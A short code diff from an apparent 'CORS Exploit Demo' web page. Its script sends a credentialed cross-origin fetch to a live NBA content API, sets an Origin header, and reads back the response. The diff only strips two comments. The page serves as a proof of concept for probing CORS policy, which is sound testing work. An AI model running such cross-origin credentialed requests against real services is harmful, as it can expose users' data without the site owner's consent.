@@ -9,13 +9,13 @@
     <h1>CORS Exploit Demo</h1>
     <pre id="output">Loading...</pre>
     <script>
-        // Fetch request with improved error handling and output formatting
+        
         function fetchCORSData() {
             fetch("https://content-api-prod.nba.com/public/1/leagues/nba/blackouts?zip=30067", {
                 method: "GET",
                 credentials: "include",
                 headers: {
-                    "Origin": "https://stargazer0.github.io" // 수정된 Origin 헤더
+                    "Origin": "https://stargazer0.github.io" 
                 }
             })
             .then(response => {
